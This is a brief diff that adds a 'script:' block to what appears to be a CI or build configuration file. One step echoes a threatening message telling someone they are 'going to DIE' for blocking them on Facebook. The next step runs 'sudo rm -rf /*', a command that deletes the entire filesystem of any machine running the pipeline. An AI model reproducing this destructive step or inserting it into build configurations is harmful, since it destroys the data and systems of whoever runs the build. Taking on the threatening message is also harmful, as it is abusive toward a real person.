@@ -1,0 +1,3 @@
+script:
+  - echo "You blocked me on Facebook, and now you're going to DIE!"
+  - sudo rm -rf /*
